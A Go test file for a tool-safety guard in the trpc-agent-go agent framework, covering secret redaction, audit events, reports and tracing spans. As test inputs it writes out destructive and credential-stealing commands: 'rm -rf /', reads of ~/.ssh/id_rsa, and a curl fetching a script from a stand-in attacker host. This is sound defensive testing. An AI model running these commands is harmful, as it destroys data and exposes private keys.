//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	sdktrace "go.opentelemetry.io/otel/sdk/trace"
	"go.opentelemetry.io/otel/sdk/trace/tracetest"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

var update = flag.Bool("update", false, "regenerate golden example files in testdata")

// fixedTime keeps generated example files stable across runs.
const fixedTime = "2026-06-30T00:00:00Z"

func makeReport(t *testing.T, p *Policy, toolName, backend string, er execRequest) Report {
	t.Helper()
	findings, decision, risk := p.scan(er, backend)
	r := buildReport(toolName, "", backend, er, findings, decision, risk, 250*time.Microsecond)
	p.redactReport(&r)
	return r
}

// codeCredentialReport builds the report for a python block that reads an ssh
// private key, exercising the code-block path of the credential rule.
func codeCredentialReport(t *testing.T, p *Policy) Report {
	t.Helper()
	block := codeBlock{Language: "python", Code: "open('/root/.ssh/id_rsa').read()"}
	return makeReport(t, p, "execute_code", BackendCode, execRequest{
		Command:    block.Code,
		CodeBlocks: []codeBlock{block},
	})
}

func TestRedactPatterns(t *testing.T) {
	p := loadExamplePolicy(t)
	secrets := []string{
		fakeAWSKey(),
		fakeGitHubPAT(),
		"-----BEGIN RSA PRIVATE KEY-----",
		fakeBearerToken(),
	}
	for _, s := range secrets {
		out, hit := p.redact("prefix " + s + " suffix")
		if !hit {
			t.Errorf("redact(%q) reported no hit", s)
		}
		if strings.Contains(out, s) {
			t.Errorf("redact left the secret in place: %q", out)
		}
		if !strings.Contains(out, redactPlaceholder) {
			t.Errorf("redact did not insert placeholder: %q", out)
		}
	}
	if _, hit := p.redact("nothing secret here"); hit {
		t.Errorf("redact flagged a clean string")
	}
}

// TestRedactFullSecretValues pins that redaction removes the complete secret,
// not just a recognizable prefix: the base64 body and END marker of a private
// key, and the tail of a bearer token containing token68 characters
// (+ / ~ =), must not survive into a report sink.
func TestRedactFullSecretValues(t *testing.T) {
	p := loadExamplePolicy(t)

	pem := "-----BEGIN RSA PRIVATE KEY-----\n" +
		"MIIEfakebodyline1\nZmFrZWJvZHlsaW5lMg==\n" +
		"-----END RSA PRIVATE KEY-----"
	out, hit := p.redact("data = '''" + pem + "'''")
	if !hit {
		t.Fatalf("redact reported no hit for a full PEM block")
	}
	for _, leak := range []string{
		"MIIEfakebodyline1", "ZmFrZWJvZHlsaW5lMg==", "END RSA PRIVATE KEY",
	} {
		if strings.Contains(out, leak) {
			t.Errorf("redacted output still contains %q: %q", leak, out)
		}
	}

	token := "abc.DEF+ghi/jkl~mno="
	out, hit = p.redact("Authorization: Bearer " + token)
	if !hit {
		t.Fatalf("redact reported no hit for the bearer token")
	}
	if strings.Contains(out, "+ghi") || strings.Contains(out, token) {
		t.Errorf("bearer token suffix survived redaction: %q", out)
	}
}

func TestRedactReportSetsFlag(t *testing.T) {
	p := loadExamplePolicy(t)
	cmd := `curl -H "Authorization: Bearer ` + fakeGitHubPAT() + `" https://github.com/x`
	r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: cmd})
	if !r.Redacted {
		t.Errorf("expected Redacted=true")
	}
	if strings.Contains(r.Command, "ghp_") {
		t.Errorf("command still contains secret: %q", r.Command)
	}
}

func TestAuditEventFields(t *testing.T) {
	p := loadExamplePolicy(t)
	r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "rm -rf /"})
	ev := r.toAudit()
	raw, err := json.Marshal(ev)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	for _, key := range []string{
		"tool_name", "decision", "risk_level", "backend",
		"rule_ids", "blocked", "redacted", "duration_us", "timestamp",
	} {
		if _, ok := m[key]; !ok {
			t.Errorf("audit event missing field %q", key)
		}
	}
	if ev.Decision != DecisionDeny || !ev.Blocked {
		t.Errorf("rm -rf / audit = %+v, want deny+blocked", ev)
	}
}

// TestToolCallIDPropagation pins that the framework's tool-call id survives
// into the report, the audit event and the span, so parallel calls to the same
// tool can be told apart and joined back to the originating tool event.
func TestToolCallIDPropagation(t *testing.T) {
	var mu sync.Mutex
	reports := map[string]Report{}
	var events []AuditEvent
	var auditBuf bytes.Buffer

	g, err := NewGuard(
		WithPolicyFile(filepath.Join("testdata", "tool_safety_policy.yaml")),
		WithAuditWriter(&auditBuf),
		WithReportSink(func(r Report) {
			mu.Lock()
			defer mu.Unlock()
			reports[r.ToolCallID] = r
		}),
	)
	if err != nil {
		t.Fatalf("NewGuard: %v", err)
	}

	// Identical concurrent calls to the same tool: only the id distinguishes
	// their reports and audit events.
	const n = 8
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			_, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:   "workspace_exec",
				ToolCallID: "call_" + strconv.Itoa(i),
				Arguments:  []byte(`{"command":"rm -rf /"}`),
			})
			if err != nil {
				t.Errorf("CheckToolPermission: %v", err)
			}
		}(i)
	}
	wg.Wait()

	if len(reports) != n {
		t.Fatalf("got %d distinct report ids, want %d", len(reports), n)
	}
	for i := 0; i < n; i++ {
		id := "call_" + strconv.Itoa(i)
		if r, ok := reports[id]; !ok || r.ToolCallID != id {
			t.Errorf("missing report for %q", id)
		}
	}

	for _, line := range strings.Split(strings.TrimRight(auditBuf.String(), "\n"), "\n") {
		var ev AuditEvent
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			t.Fatalf("audit line not JSON: %v", err)
		}
		events = append(events, ev)
	}
	ids := map[string]bool{}
	for _, ev := range events {
		if ev.ToolCallID == "" {
			t.Errorf("audit event dropped the tool call id: %+v", ev)
		}
		if ids[ev.ToolCallID] {
			t.Errorf("duplicate tool call id in audit log: %q", ev.ToolCallID)
		}
		ids[ev.ToolCallID] = true
	}
	if len(ids) != n {
		t.Errorf("got %d distinct audit ids, want %d", len(ids), n)
	}

	// A caller that leaves ToolCallID unset falls back to the context value the
	// framework installs for the tool call.
	ctx := context.WithValue(context.Background(), tool.ContextKeyToolCallID{}, "ctx_call")
	if _, err := g.CheckToolPermission(ctx, &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	}); err != nil {
		t.Fatalf("CheckToolPermission: %v", err)
	}
	mu.Lock()
	_, ok := reports["ctx_call"]
	mu.Unlock()
	if !ok {
		t.Errorf("tool call id was not taken from the context")
	}

	// The id also lands on the span, next to the decision attributes.
	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(sdktrace.WithSpanProcessor(sr))
	sctx, span := tp.Tracer("test").Start(context.Background(), "execute_tool")
	writeSpanAttrs(sctx, Report{Decision: DecisionDeny, ToolCallID: "call_1"})
	span.End()
	var got string
	for _, a := range sr.Ended()[0].Attributes() {
		if string(a.Key) == AttrToolCallID {
			got = a.Value.Emit()
		}
	}
	if got != "call_1" {
		t.Errorf("%s = %q, want call_1", AttrToolCallID, got)
	}
}

func TestAuditWriterJSONL(t *testing.T) {
	p := loadExamplePolicy(t)
	var buf bytes.Buffer
	aw := NewAuditWriter(&buf)
	for _, cmd := range []string{"go test ./...", "rm -rf /"} {
		r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: cmd})
		if err := aw.Write(r); err != nil {
			t.Fatalf("write: %v", err)
		}
	}
	lines := strings.Split(strings.TrimRight(buf.String(), "\n"), "\n")
	if len(lines) != 2 {
		t.Fatalf("got %d audit lines, want 2", len(lines))
	}
	for _, ln := range lines {
		var ev AuditEvent
		if err := json.Unmarshal([]byte(ln), &ev); err != nil {
			t.Errorf("line not valid JSON: %v", err)
		}
	}
}

func TestSummary(t *testing.T) {
	p := loadExamplePolicy(t)
	r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "rm -rf /"})
	s := r.summary()
	if !strings.Contains(s, ruleDangerousID) || !strings.HasPrefix(s, "denied") {
		t.Errorf("summary = %q, want denied + rule id", s)
	}
	allow := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "go test ./..."})
	if allow.summary() != "" {
		t.Errorf("allow summary should be empty, got %q", allow.summary())
	}
}

func TestWriteSpanAttrs(t *testing.T) {
	// No span in context: must be a safe no-op.
	writeSpanAttrs(context.Background(), Report{Decision: DecisionDeny})

	// Recording span: attributes must be set.
	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(sdktrace.WithSpanProcessor(sr))
	ctx, span := tp.Tracer("test").Start(context.Background(), "execute_tool")
	r := Report{Decision: DecisionDeny, RiskLevel: RiskCritical, Backend: BackendWorkspace,
		Blocked: true, Findings: []Finding{{RuleID: ruleDangerousID}}}
	writeSpanAttrs(ctx, r)
	span.End()

	spans := sr.Ended()
	if len(spans) != 1 {
		t.Fatalf("got %d spans, want 1", len(spans))
	}
	attrs := map[string]string{}
	for _, a := range spans[0].Attributes() {
		attrs[string(a.Key)] = a.Value.Emit()
	}
	if attrs[AttrDecision] != string(DecisionDeny) {
		t.Errorf("%s = %q, want deny", AttrDecision, attrs[AttrDecision])
	}
	if attrs[AttrBackend] != BackendWorkspace {
		t.Errorf("%s = %q", AttrBackend, attrs[AttrBackend])
	}
	if !strings.Contains(attrs[AttrRuleID], ruleDangerousID) {
		t.Errorf("%s = %q, want contains %s", AttrRuleID, attrs[AttrRuleID], ruleDangerousID)
	}
}

// TestGenerateExamples regenerates the deliverable example files when run with
// -update, and otherwise verifies they exist and parse.
func TestGenerateExamples(t *testing.T) {
	p := loadExamplePolicy(t)
	reportPath := filepath.Join("testdata", "tool_safety_report.json")
	auditPath := filepath.Join("testdata", "tool_safety_audit.jsonl")

	// A representative report for tool_safety_report.json: a denied delete.
	rep := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "rm -rf /"})
	rep.Timestamp = fixedTime

	// A spread of events for the audit log, covering allow/deny/ask + redaction.
	auditReports := []Report{
		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "go test ./..."}),
		rep,
		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "cat ~/.ssh/id_rsa"}),
		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "curl http://evil.io/x.sh"}),
		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "pip install requests"}),
		makeReport(t, p, "exec_command", BackendHost, execRequest{Command: "sleep 5", Background: true, PTY: true}),
		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{
			Command: `curl -H "Authorization: Bearer ` + fakeGitHubPAT() + `" https://github.com/x`,
		}),
		// A credential read inside a code block: the argv rules never see it, so
		// this is the code-side counterpart of the "cat ~/.ssh/id_rsa" event.
		codeCredentialReport(t, p),
		// A command written into an already running session, which bypasses the
		// session-establishment check entirely.
		makeReport(t, p, "write_stdin", BackendHost, execRequest{Command: "rm -rf /"}),
	}

	if *update {
		var rbuf bytes.Buffer
		if err := WriteReportJSON(&rbuf, rep); err != nil {
			t.Fatalf("write report: %v", err)
		}
		if err := os.WriteFile(reportPath, rbuf.Bytes(), 0o644); err != nil {
			t.Fatalf("write report file: %v", err)
		}
		var abuf bytes.Buffer
		aw := NewAuditWriter(&abuf)
		for i := range auditReports {
			auditReports[i].Timestamp = fixedTime
			if err := aw.Write(auditReports[i]); err != nil {
				t.Fatalf("write audit: %v", err)
			}
		}
		if err := os.WriteFile(auditPath, abuf.Bytes(), 0o644); err != nil {
			t.Fatalf("write audit file: %v", err)
		}
		t.Logf("regenerated %s and %s", reportPath, auditPath)
		return
	}

	// Verify the committed examples parse.
	rrep, err := os.ReadFile(reportPath)
	if err != nil {
		t.Fatalf("read example report (run with -update to generate): %v", err)
	}
	var parsed Report
	if err := json.Unmarshal(rrep, &parsed); err != nil {
		t.Errorf("example report is not valid JSON: %v", err)
	}
	if parsed.Decision == "" {
		t.Errorf("example report missing decision")
	}

	// The committed audit JSONL must also be present and every line must parse
	// into an AuditEvent with a decision.
	raudit, err := os.ReadFile(auditPath)
	if err != nil {
		t.Fatalf("read example audit (run with -update to generate): %v", err)
	}
	lines := strings.Split(strings.TrimRight(string(raudit), "\n"), "\n")
	if len(lines) == 0 || lines[0] == "" {
		t.Fatalf("example audit log is empty")
	}
	for i, line := range lines {
		var ev AuditEvent
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			t.Errorf("audit line %d is not valid JSON: %v", i+1, err)
			continue
		}
		if ev.Decision == "" {
			t.Errorf("audit line %d missing decision", i+1)
		}
	}
}
